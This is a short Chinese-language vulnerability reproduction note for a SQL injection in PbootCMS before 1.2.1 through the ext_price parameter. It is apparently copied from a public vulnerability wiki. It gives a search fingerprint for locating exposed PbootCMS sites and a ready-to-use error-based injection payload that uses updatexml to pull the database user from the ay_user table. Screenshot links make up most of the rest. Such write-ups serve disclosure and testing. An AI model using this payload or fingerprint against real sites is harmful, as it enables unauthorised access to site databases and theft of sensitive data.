---
title: "PbootCMS ext_price SQL注入漏洞"
date: 2026-10-12 09:00:56
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "PbootCMS"
tags:
  - "PbootCMS"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

```
PbootCMS < 1.2.1
```

## 网络测绘

```
app="PBOOTCMS"
```

## 漏洞复现

主页

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170926840.png)

测试 Payload

```plain
/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170926157.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/PbootCMS-ext_price-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
